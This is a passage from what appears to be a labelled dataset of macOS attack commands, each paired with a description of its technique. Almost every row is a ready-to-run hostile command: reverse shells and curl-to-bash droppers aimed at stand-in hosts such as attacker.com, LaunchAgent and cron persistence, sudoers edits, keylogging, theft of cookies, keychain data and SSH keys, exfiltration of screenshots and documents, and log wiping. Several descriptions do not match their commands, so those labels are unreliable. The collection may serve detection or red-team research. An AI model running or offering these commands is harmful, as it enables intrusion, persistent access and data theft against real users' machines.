		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/malicious.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist file after exploiting a buffer overflow vulnerability in an Apache server on a macOS system."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/payload.sh | /bin/bash","Persistence via a cron job that downloads and executes a script every hour."
"sqlite3 ~/Library/Safari/History.db 'SELECT url FROM history_items;' > browsing_history.txt","Extracting web browsing history from a macOS system."
"cp ~/Library/Application\ Support/Google/Chrome/Default/Cookies ~/Desktop/stolen_cookies","Stealing cookies from Chrome on a macOS system."
"sudo sh -c 'echo \""$(whoami) ALL=(ALL) NOPASSWD:ALL\"" >> /etc/sudoers'","Privilege escalation by exploiting sudo timestamp spoofing to alter the sudoers file."
"curl -s http://example.com/malicious-script | sh","Malware installation using a disguised curl command to download and execute a script."
"echo 'curl -s http://example.com/rootkit.sh | sudo sh' >> /etc/profile","Rootkit embedding by appending a malicious script to the global system profile."
"sudo install_name_tool -change libsystem_network.dylib /tmp/malicious_network.dylib /usr/lib/system/libsystem_network.dylib","Network stack tampering by inserting a nefarious dynamic library to intercept network calls."
"echo '127.0.0.1 example.com' | sudo tee -a /etc/hosts","Traffic redirection by modifying the hosts file to redirect traffic to a malicious server."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/script.sh | /bin/bash","Persistence via cron job to download and execute a script every hour."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/usr/bin/osascript -e \""do shell script \""'/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'\""\""', hidden:false}'","Adding a login item that opens a reverse shell to a remote server."
"sudo defaults write com.apple.loginwindow LoginHook /usr/local/bin/loginhook.sh && echo '#!/bin/bash\n/usr/sbin/system_profiler SPHardwareDataType | /usr/bin/curl -d @- http://attacker.com/upload' > /usr/local/bin/loginhook.sh && chmod +x /usr/local/bin/loginhook.sh","Creating a login hook script that sends system information to a remote server."
"while true; do pbpaste > /tmp/clipboard.txt; sleep 10; done","Clipboard monitoring to capture user's copy-paste actions."
"sqlite3 ~/Library/Safari/History.db 'select url from history_items;' > /tmp/safari_history.txt","Retrieving browser history from Safari."
"launchctl setenv RDP_SESSION_HIJACK 'true' && security dump-keychain -d login.keychain > ~/Desktop/stolen_credentials.txt","Gaining unauthorized remote access by hijacking existing RDP sessions and stealing keychain credentials on a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-L</string>
		<string>http://attacker.com/malware</string>
		<string>-o</string>
		<string>/tmp/malware.sh</string>
		<string>;</string>
		<string>/bin/bash</string>
		<string>/tmp/malware.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist to maintain remote access."
"for user in $(cat common_usernames.txt); do sshpass -f default_passwords.txt ssh $user@target_ip_address 'whoami'; done","Gaining unauthorized remote access through SSH using password spraying against common usernames with a default password list."
"zip -r confidential_docs.zip ~/Documents/Confidential && openssl base64 < confidential_docs.zip | mail -s 'Confidential Documents' -a 'Content-Type: application/octet-stream' recipient@example.com","Exfiltration of confidential documents from a macOS system by compressing and emailing the files through an encrypted connection to bypass network monitoring."
"osascript -e 'do shell script ""launchctl load -w /Library/LaunchDaemons/com.malicious.plist"" with administrator privileges'","Persistence via malicious plist leveraging third-party driver vulnerabilities."
"echo ""alias ssh='SSH_AUTH_SOCK=~/malicious_agent.sock ssh'"" >> ~/.bash_profile && source ~/.bash_profile","Persistence via SSH agent hijacking on a macOS system."
"screencapture -x ~/Desktop/capture.png && curl -T ~/Desktop/capture.png ftp://attacker.com/uploads/","Screen capture automation for data exfiltration."
"osascript -e 'set the clipboard to (the clipboard as record)' -e 'write (the clipboard as «class PNGf») to (open for access ""~/Desktop/clipboard.png"" with write permission)'","Clipboard image extraction to a file."
"imagesnap -q ~/Desktop/camera_snap.jpg && curl -F 'file=@/Desktop/camera_snap.jpg' http://attacker.com/upload","Scripted camera capture for unauthorized access."
"zip -r confidential.zip ~/Documents/confidential && split -b 10m confidential.zip 'confidential.part_' && for file in confidential.part_*; do uuencode $file $file | mail -s 'Confidential Part' target@example.com; done","Exfiltrating confidential documents by compressing and splitting them into smaller parts to bypass email attachment size limits."
"ssh-keyscan -t rsa,dsa attacker.com >> ~/.ssh/known_hosts","Tampering with the SSH known_hosts file to facilitate man-in-the-middle attacks."
"find ~/Documents -type f -name '*.pdf' -exec tar -czvf documents.tar.gz {} + && echo 'Documents attached' | mail -s 'Confidential Documents' -A documents.tar.gz recipient@example.com","Locating all PDF files in the Documents folder and sending them to an external email address using the mail command."
"echo 'newadmin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers","Privilege escalation by adding a new user to the sudoers file without proper authorization."
"chmod +x /path/to/unauthorized/file","A scenario where file permissions are manipulated to grant executable rights to an unauthorized file."
"sudo chown newowner /path/to/target/file","A situation where the ownership of a file is changed to a different user without authorization."
"chmod o+w /path/to/protected/file","An instance where a non-privileged user gains write access to a file that should be protected."
"curl -s http://example.com/fake-update.sh > /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh","Malware installation using a disguised script that appears to be a legitimate software update."
"hdiutil attach -nobrowse http://example.com/malicious.dmg && cp /Volumes/Malicious/malicious.doc /tmp && open /tmp/malicious.doc","Exploit kits executing through a downloaded payload that is run under the guise of a document."
"osascript -e 'tell app ""Terminal"" to do script ""bash -i >& /dev/tcp/attacker.com/4444 0>&1""'","Delivery of a payload via spear phishing attachment that, when opened, establishes a backdoor."
"mdls -name kMDItemFSName -name kMDItemContentCreationDate -name kMDItemWhereFroms suspicious.pdf | grep 'http' | xargs curl | bash","Malware installation through a disguised Bash script embedded in a PDF file metadata."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised script from a remote server."
"mkdir ~/.hidden && curl -o ~/.hidden/rootkit http://malicious-url.com/rootkit && chmod +x ~/.hidden/rootkit && ~/.hidden/rootkit","Rootkit embedding through a hidden directory and executable."
"curl -o /tmp/malicious.kext http://malicious-url.com/malicious.kext && kextload /tmp/malicious.kext","Kernel module injection using a malicious Loadable Kernel Module (LKM)."
"nvram boot-args=""kext-dev-mode=1"" && kextload /tmp/unsigned.kext","Loading an unsigned kernel extension to bypass macOS security features."
"cd ~/Documents && tar -czf confidential-docs.tar.gz * && curl --upload-file ./confidential-docs.tar.gz https://malicious-server.com/upload","Automatic transmission of documents from a macOS system using data compression methods for exfiltration, specifically through tarball creation."
"find / -perm -4002 -type f -exec ls -ld {} \;","Locating world-writable setuid files on a macOS system."
"while true; do inotifywait -e create ~/Documents && rsync -a ~/Documents/* attacker@remote-server:/path/to/exfiltrate; done","A script that monitors the Documents directory for new files and silently exfiltrates them to a remote server."
"echo 'echo ""bash -i >& /dev/tcp/attacker.com/4444 0>&1""' >> ~/.bash_profile","Persistence via unauthorized remote login using a backdoor trojan."
"while true; do screencapture -x ~/Desktop/capture.png; curl -T ~/Desktop/capture.png ftp://attacker.com/uploads/; sleep 300; done","Automating screen capture and exfiltration on a macOS system."
"curl -s http://malicious-url.com/fakeapp.dmg -o /tmp/fakeapp.dmg && hdiutil attach /tmp/fakeapp.dmg && cp -R /Volumes/FakeApp/fakeapp.app /Applications/","Malware installation by disguising it as a legitimate application through a bash script."
"echo 'open /Applications/trojan.app' >> ~/.bash_profile","Trojan applications executing upon user login."
"sudo cp /path/to/rootkit.kext /System/Library/Extensions/ && sudo kextload /System/Library/Extensions/rootkit.kext","Rootkit embedding to hide malicious activity."
"sudo kextunload /System/Library/Extensions/valid.kext && sudo kextload /path/to/malicious.kext","Kernel module tampering to intercept system calls."
"cp /bin/sh /tmp/privileged_sh && chmod 4755 /tmp/privileged_sh","Privilege escalation by exploiting a setuid binary on macOS."
"DYLD_LIBRARY_PATH=/path/to/malicious/libraries /path/to/vulnerable/app","Hijacking library paths to execute arbitrary code with elevated privileges."
"export PATH=/malicious/directory:$PATH","Manipulating the PATH variable to execute malicious code."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Altering the sudoers file to grant unauthorized admin privileges without requiring a password."
"tar -czvf /tmp/documents_archive.tar.gz ~/Documents/* && curl --upload-file /tmp/documents_archive.tar.gz http://malicious-server.com/upload","Exfiltration of all documents from a user's Documents directory using gzip compression before automatic transmission to a remote server."
"Persistence via malicious document. A macro within a Word document executes: osascript -e 'do shell script ""curl http://malicious-url.com/payload.sh -o /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh"" with administrator privileges'.","A scenario where a macOS system is compromised through remote code execution by leveraging a malware-infected email attachment."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/backdoor</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via launch agents by installing a backdoor that executes a remote access tool at startup."
"while true; do screencapture -x ~/Desktop/capture_$(date +'%Y%m%d%H%M%S').png; sleep 300; done & disown","Automated screen capture and exfiltration on a macOS system."
"python -c 'import sys, keyboard; keyboard.start_recording(); sys.stdout = open(""/tmp/keystrokes.txt"", ""w""); keyboard.wait(""ESC"")'","Integration of keylogging functionality on macOS."
"while [ true ]; do sleep 3600; mail -s ""Keylogs"" -A /tmp/keystrokes.txt recipient@example.com < /dev/null; done & disown","Sending keylogs via email from a macOS system."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised curl command to download and execute a script."
"sudo cp /path/to/malicious/binary /usr/local/bin/ && sudo chmod +x /usr/local/bin/binary","Rootkit embedding by injecting a compiled binary into a system directory."
"touch ~/.hidden && chmod 000 ~/.hidden","Hidden file creation in a user's home directory for storing stolen data."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>sh</string>
 <string>-c</string>
 <string>curl -s http://malicious-url.com/payload | sh</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistent launch agents by adding a plist file to the user's LaunchAgents directory."
"while true; do pbpaste | nc attacker.com 1337; sleep 10; done","Malicious script to monitor clipboard data and send it to a remote server on macOS."
"osascript -e 'tell application ""Finder"" to make new login item at end with properties {path:""/path/to/malicious.app"", hidden:false}'","Persistence mechanism using scripting additions to execute a malicious payload every time a user logs in."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -fsSL http://malicious-url.com/payload.sh | sh</string>
	</array>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via launch agent to execute a command every 5 minutes."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation by executing a script downloaded from a remote server."
"bash -c ""$(curl -fsSL http://exploit-kit.com/kit.sh)""","Exploit kit execution to take advantage of system vulnerabilities."
"nmap -sV localhost","Scanning the system for vulnerabilities using a command-line tool."
"nmap -sV -p 1-65535 localhost","Identifying service versions to find potential attack vectors."
"while true; do ln -sf /tmp/legitimate_file /tmp/vulnerable_link; ln -sf /etc/sudoers /tmp/vulnerable_link; done","Privilege escalation by exploiting race conditions in macOS kernel."
"echo 'echo ""$(whoami) ALL=(ALL) NOPASSWD:ALL"" >&3' | COLUMNS=1 LINES=1 /usr/bin/vim -u NONE -X -n -i NONE -c ':source /dev/stdin' -c ':wq! /etc/sudoers' -c ':q!' /dev/null","Exploiting a race condition to gain write access to protected files."
"echo '@reboot sudo /path/to/malicious/script.sh' | crontab -","Persistence via cron job that elevates privileges and executes a malicious script at system startup."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-L</string>
		<string>http://malicious-url.com/backdoor.sh</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load -w ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious launch agent to maintain remote access."
"sudo nvram boot-args=""kext-dev-mode=1"" && sudo kextload /path/to/unsigned.kext","Kernel extension manipulation to load an unsigned kext."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.apple.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/python</string>
		<string>/Users/Shared/.keylogger.py</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.apple.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.apple.keylogger.plist","Persistence via malicious plist to establish a keylogger that captures keystrokes."
"security authorizationdb read system.login.console | sed 's/""shared""/""rule""/g' | security authorizationdb write system.login.console","Interception of login credentials by modifying the system's authorization database."
"sudo tcpdump -i any -w ~/Desktop/network_traffic.pcap","Monitoring network traffic by installing a packet sniffer on a macOS system."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/MaliciousApp.app"", hidden:false}'","Persistence via login item by adding a malicious application to the user's login items."
"while true; do sshpass -p 'password123' ssh -o StrictHostKeyChecking=no user@example.com; done","Establishing unauthorized remote access through an SSH brute force attack."
"for port in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $port example.com; done && ssh user@example.com","Using port knocking to evade firewall rules and gain unauthorized remote access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/nc</string>
		<string>-l</string>
		<string>-p</string>
		<string>9999</string>
		<string>-e</string>
		<string>/bin/sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist for backdoor access."
"sudo tcpdump -i en0 -w ~/Desktop/sniffed_packets.pcap","Intercepting network traffic through packet sniffing."
"echo ""* * * * * /bin/bash -c \""$(curl -fsSL http://malicious-url.com/script.sh)\"""" | crontab -","Persistence by adding a cron job to periodically download and execute a script from a malicious server."
"tar -czvf sensitive_files.tar.gz ~/Documents/SensitiveFiles/ && ssh -R 2222:localhost:22 user@remotehost 'scp -P 2222 ~/Documents/sensitive_files.tar.gz user@localhost:/path/to/store'","Compressing sensitive files in the Documents directory and exfiltrating them via SSH using scp with port forwarding."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.login</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.login.plist && launchctl load ~/Library/LaunchAgents/com.malicious.login.plist","Persistence via malicious plist file that executes a script every login"
"curl -s http://compromisedwebsite.com/malware.dmg > /tmp/malware.dmg && hdiutil attach /tmp/malware.dmg && cp -R /Volumes/malware/malware.app /Applications/","Malware installation through drive-by downloads initiated by visiting compromised websites which lead to malvertising."
"find ~/ -name 'id_rsa' -exec scp {} attacker@malicious-server.com:/stolen_keys/ \;","Exfiltrating SSH private keys from a macOS system."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.bash_profile && source ~/.bash_profile","Setting up remote access on a macOS machine by installing a reverse shell."
"echo 'export DYLD_INSERT_LIBRARIES=/path/to/hijack.dylib' >> ~/.zshrc && osascript -e 'tell app ""Remote Desktop Connection"" to activate'","Exploiting the remote desktop protocol to initiate an RDP session hijacking."
"sudo kextload /path/to/unsigned/malicious.kext","Persistence via malicious kernel extension loaded at boot time."
"curl -s http://phishing-website.com/malware.dmg > /tmp/malware.dmg && hdiutil attach /tmp/malware.dmg && cp -R /Volumes/MalwareApp/MalwareApp.app /Applications/ && hdiutil detach /Volumes/MalwareApp","Malware installation via drive-by download from a phishing website."
"TF=$(mktemp) && echo 'ALL ALL=(ALL) NOPASSWD: ALL' > $TF && sudo visudo -cf $TF && if [ $? -eq 0 ]; then sudo visudo -f /etc/sudoers.d/$(basename $TF) < $TF; fi && rm -f $TF","Privilege escalation by exploiting sudo misconfigurations through environment variable manipulation."
"sudo /usr/bin/python -m SimpleHTTPServer 80 &> /dev/null & echo 'import socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(("""", 22)); s.listen(1); conn, addr = s.accept(); while True: data = conn.recv(1024); if not data: break; proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE); stdout_value = proc.stdout.read() + proc.stderr.read(); conn.send(stdout_value); conn.close();' > /tmp/ssh_stealer.py && sudo /usr/bin/python /tmp/ssh_stealer.py &","Persistence through unauthorized remote login by creating a fake SSH server to capture credentials."
"echo 'curl -s http://malicious-url.com/script.sh | sh' >> ~/.bash_profile","Persistence via addition of a malicious script to the user's .bash_profile for continuous execution."
"curl -s http://malicious-url.com/keylogger -o ~/Library/.hidden_keylogger && chmod +x ~/Library/.hidden_keylogger && nohup ~/Library/.hidden_keylogger &","Installation of a keylogger to monitor user keystrokes on a macOS system."
"sed -i '' '/unauthorized_access/d' /var/log/system.log","Altering system logs to hide evidence of unauthorized access."
"openssl enc -aes-256-cbc -salt -in /var/log/system.log -out /var/log/system.log.enc -k passw0rd && rm /var/log/system.log","Encrypting log files to prevent analysis by system administrators."
"cd /tmp && curl -o exploit.bin http://malicious-url.com/exploit.bin && chmod +x exploit.bin && ./exploit.bin","Privilege escalation by exploiting patched kernel vulnerabilities for rootkit insertion."
"dig +short txt _exfiltrate.example.com @ns1.dnsserver.com","Data exfiltration via DNS tunneling that avoids network monitoring."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/malicious.app"", hidden:false}'","Persistence via malicious login item added to a user's login items list."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.reverse_shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse_shell.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse_shell.plist","Persistence via malicious plist that initiates a reverse shell on system startup."
"scp ~/Documents/sensitive_data.pdf user@remote-server.com:/path/to/store/","Exfiltrating sensitive documents from a macOS system to a remote server."
"nc -l 4444","Configuring a listening port on a macOS system to establish a backdoor."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-L</string>
		<string>http://malicious-url.com/backdoor.sh</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist to establish a backdoor on macOS."
"echo 'while :; do echo .; sleep 1; done' >> ~/.bash_profile","Malicious process creation by injecting a script into system startup files to maintain persistence."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.network.monitor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/python</string>
		<string>/Users/Shared/networktraffic.py</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.network.monitor.plist && launchctl load ~/Library/LaunchAgents/com.network.monitor.plist","Persistence via malicious plist to monitor network traffic and exfiltrate data."
"sudo tcpdump -i en0 -w /tmp/network_traffic.pcap","Command to sniff network traffic using tcpdump and save to a file for later analysis."
"sudo dnsspoof -i en0 -f /etc/dnsspoof_hosts","Code for DNS spoofing on a local network."
"sudo arpspoof -i en0 -t target_ip gateway_ip","Establishing a man-in-the-middle attack using ARP poisoning."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised script downloaded from the internet."
"echo '/path/to/malicious.dylib' >> /etc/ld.so.preload","Rootkit embedding by appending a malicious dynamic library to system daemons."
"DYLD_INSERT_LIBRARIES=/path/to/hook_library.dylib /Applications/TargetApp.app/Contents/MacOS/TargetApp","Process hooking to monitor and manipulate system calls by injecting code into running processes."
"DYLD_INTERPOSE=/path/to/interpose_library.dylib /Applications/VictimApp.app/Contents/MacOS/VictimApp","Userland API interception to capture and modify system function calls."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to execute a keylogger at system startup."
"while true; do screencapture -x ~/Library/.hidden/screenshot$(date +%s).png; sleep 300; done","Capture screen activity periodically and save screenshots to a hidden directory."
"ffmpeg -f avfoundation -i ""1"" -vframes 1 ~/Library/Caches/.screencapture_$(date +%s).jpg","Misuse of video capture software to record user's screen without their knowledge."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.user.monitoractivity</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/script</string>
		<string>-q</string>
		<string>/dev/null</string>
		<string>log</string>
		<string>stream</string>
		<string>--predicate</string>
		<string>eventMessage contains ""authentication""</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.user.monitoractivity.plist && launchctl load ~/Library/LaunchAgents/com.user.monitoractivity.plist","Persistence via malicious plist to monitor user activity on macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.keylogger</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/local/bin/keylogger</string>
 </array>
 <key>StartInterval</key>
 <integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to execute a keylogger every 5 minutes."
"sed -i '' '/malicious/d' /var/log/system.log","Altering system logs to hide malicious activity."
"chmod 600 /var/log/*.log","Modifying log file permissions to prevent other users from accessing them."
"ssh -o 'ProxyCommand=sh -i < /dev/null 2>/dev/null' user@vulnerable-mac.com","Gaining unauthorized remote access to a macOS system by exploiting SSH daemon configuration vulnerabilities."
"echo 'osascript -e ""do shell script \""chmod 4755 /bin/bash\"" with administrator privileges""' | sudo -s","Escalating privileges on a macOS system post-login by exploiting misconfigured sudo permissions."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/backdoor</string>
		<string>http://malicious-url.com/backdoor</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist file to maintain remote access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/backdoor.sh</string>
		<string>http://malicious-url.com/backdoor.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist file to maintain access to a macOS system."
"osascript -e 'do shell script ""bash -i >& /dev/tcp/attacker.com/4444 0>&1""'","Establishing a reverse shell connection on a macOS system by exploiting a vulnerable browser extension."
"cp /usr/bin/env /tmp/; echo 'echo malicious_code' > /tmp/env; chmod u+s /tmp/env","Injecting malicious code into a setuid executable to perform privilege escalation."
"touch /tmp/.hidden_command; echo 'cd ~/Documents/Sensitive && /usr/local/bin/rar a -v10M -m5 -r /tmp/backup.rar *' > /tmp/.hidden_command && chmod +x /tmp/.hidden_command && /usr/bin/at now + 1 minute -f /tmp/.hidden_command","Compressing sensitive documents into a split archive using rar and then obfuscating the command to avoid detection."
"screencapture -x ~/Desktop/screenshot.jpg && curl -F 'file=@/Users/$(whoami)/Desktop/screenshot.jpg' http://malicious-url.com/upload","Automating screen capture for data exfiltration on a macOS system."
"(crontab -l 2>/dev/null; echo ""*/30 * * * * screencapture -x ~/Desktop/screenshot_$(date +\""%Y%m%d%H%M%S\"").jpg && curl -F 'file=@/Users/$(whoami)/Desktop/screenshot_$(date +\""%Y%m%d%H%M%S\"").jpg' http://malicious-url.com/upload"") | crontab -","Setting up a cron job to periodically take screenshots and send them to an external server."
"osascript -e 'tell application ""Mail"" to set theMessages to every message of mailbox ""INBOX"" of account ""YourAccountName""' -e 'repeat with thisMessage in theMessages' -e 'set thisContent to content of thisMessage' -e 'do shell script ""echo "" & quoted form of thisContent & "" | mail -s "" & subject of thisMessage & "" -r "" & sender of thisMessage & "" recipient@example.com""' -e 'end repeat'","Forwarding emails from macOS Mail app using a script."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
